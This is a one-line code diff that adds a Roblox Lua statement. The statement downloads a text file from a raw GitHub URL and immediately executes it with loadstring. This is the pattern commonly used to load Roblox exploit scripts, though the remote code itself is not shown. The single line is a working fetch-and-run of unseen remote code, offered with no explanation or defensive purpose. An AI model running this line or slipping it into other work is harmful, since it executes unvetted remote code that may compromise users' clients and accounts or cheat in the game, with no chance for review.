@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/techowenzo-design/kiciatesting/refs/heads/main/message%20(55).txt"))()
